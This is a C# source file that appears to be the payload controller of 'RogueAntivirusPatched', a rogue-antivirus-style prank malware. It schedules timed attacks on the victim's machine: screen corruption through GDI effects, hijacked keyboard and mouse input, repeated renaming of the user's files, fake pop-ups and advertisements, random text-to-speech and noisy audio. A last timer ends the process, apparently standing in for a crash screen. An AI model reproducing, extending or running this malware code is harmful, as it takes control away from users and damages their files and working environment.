using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using RogueAntivirusPatched;
using System.Windows;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Rebar;
using RogueAntivirusPatched.Classes;
using static PCMAudio.PCM;
using System.Windows.Threading;
using RogueAntivirusPatched.Global;
using System.Timers;

namespace RogueAntivirusPatched.TrialMode.Payloads
{
    internal class PayloadMain
    {
        private static readonly Random rand = new Random();
        private System.Timers.Timer timerGdi, timerInputs, timerFiles, timerTTS;
        private DispatcherTimer timerAppWins;
        private static int timerInterval = 5000;

        private Action[] actionGdi, actionRest, actionAppWins;
        private Gdi gdi;
        private Beats beats;
        private FileConfuser fileConfuser;
        private VirtuaLInput virtuaLInput;
        private AppWindows appWins;
        private WindowManager winManager;

        public PayloadMain()
        {
            gdi = new Gdi();
            beats = new Beats();
            fileConfuser = new FileConfuser();
            virtuaLInput = new VirtuaLInput();
            appWins = new AppWindows();
            winManager = new WindowManager();

            actionGdi = new Action[]
            {
                gdi.DrawIcons,
                gdi.Brushes,
                gdi.LowResolution,
                gdi.RGBQUAD,
                () => gdi.Mandela(true, true, 4),
                gdi.Dislocate,
                gdi.Mirror,
                () => gdi.Stretch()
            };

            actionRest = new Action[]
            {
                virtuaLInput.CrazyKyboard,
                virtuaLInput.CrazyMouseInput
            };

            actionAppWins = new Action[]
            {
                appWins.AnnoyingPopUp,
                appWins.PopUp,
                appWins.Advertisement,
                appWins.Notifications
            };
        }

        public void JustForTest()
        {
            SetUpTimer();

            winManager.SpiralWindow();
        }

        private void SetUpTimer()
        {
            timerGdi = new System.Timers.Timer();
            timerGdi.Interval = timerInterval;
            timerGdi.Elapsed += GdiTimer_CallBack;
            timerGdi.AutoReset = false;
            timerGdi.Start();

            timerInputs = new System.Timers.Timer();
            timerInputs.Interval = timerInterval;
            timerInputs.Elapsed += InputTimer_CallBack;
            timerInputs.Start();

            timerFiles = new System.Timers.Timer();
            timerFiles.Interval = 1000;
            timerFiles.Elapsed += TimerFiles_Elapsed;
            timerFiles.AutoReset = false;
            timerFiles.Start();

            timerAppWins = new DispatcherTimer();
            timerAppWins.IsEnabled = false;
            timerAppWins.Interval = TimeSpan.FromSeconds(5);
            timerAppWins.Tick += TimerAppWins_Tick;
            timerAppWins.Start();

            timerTTS = new System.Timers.Timer();
            timerTTS.Interval = 30000;
            timerTTS.AutoReset = false;
            timerTTS.Elapsed += TimerTTS_Elapsed;
            timerTTS.Start();
        }

        private void TimerTTS_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            timerTTS.Interval = rand.Next(1000, 3000);
            string script = Variables.someResponses[rand.Next(Variables.someResponses.Length)];
            TTS.SpeakInterrupted(script, 100, rand.Next(-3, 3));
        }

        private void TimerAppWins_Tick(object sender, EventArgs e)
        {
            timerAppWins.Interval = TimeSpan.FromSeconds(rand.Next(3, 8));
            actionAppWins[rand.Next(actionAppWins.Length)]();
        }

        private async void TimerFiles_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            await Task.Run(() => {
                fileConfuser.RenameFiles();
                timerFiles.Start();
            });
        }

        private void InputTimer_CallBack(object sender, System.Timers.ElapsedEventArgs e)
        {
            var method = actionRest[rand.Next(actionRest.Length)];
            for (int i = 0; i < rand.Next(1, 10); i++)
            {
                method = actionRest[rand.Next(actionRest.Length)];
                method();
            }
            timerInputs.Interval = timerInterval;
        }

        public async void GdiTimer_CallBack(object sender, System.Timers.ElapsedEventArgs e)
        {
            var method = actionGdi[rand.Next(actionGdi.Length)];

            for (int i = 0; i < rand.Next(1, 10); i++)
            {
                method = actionGdi[rand.Next(actionGdi.Length)];
                method();
            }

            timerGdi.Interval = timerInterval;

            DetermineMelody(timerGdi.Interval);

            if (timerInterval > 100)
            {
                timerInterval -= 100;
                await Task.Delay(rand.Next(1, 800));
                gdi.CleanDc();
                timerGdi.Start();
                return;
            }
            else if (timerInterval > 10)
            {
                timerInterval -= 10;
            }
            else
            {
                timerInterval = 1;
            }

            if (rand.Next(10) == 1) { gdi.CleanDc(); }
            timerGdi.Start();
        }

        public async void DetermineMelody(double interval)
        {
            if (interval == 5000)
            {
                await beats.PCMAudio(beats.melody_its_beginning, new WaveForms[] { WaveForms.Square }, 15000, 0.1, 15);
            }

            if (interval == 3000)
            {
                await beats.PCMAudio(beats.melody_bliss, new WaveForms[] { WaveForms.Square, WaveForms.Saw }, 10000, 0.5, 10);
            }

            if (interval == 2000)
            {
                await beats.PCMAudio(beats.melody_getting_into, new WaveForms[] { WaveForms.Saw, WaveForms.Sine }, 5000, 0.5, 5);
            }

            if (interval == 10)
            {
                await beats.PCMAudio(beats.melody_messy(), new WaveForms[] { WaveForms.Saw, WaveForms.Square, WaveForms.Noise, WaveForms.Sine, WaveForms.Triangle }, 3000, 0.5, 30);
                var timerBSOD = new Timer();
                timerBSOD.Interval = 80000;
                timerBSOD.Enabled = true;
                timerBSOD.Elapsed += (s, e) => { Environment.Exit(0); };
            }
        }
    }
}
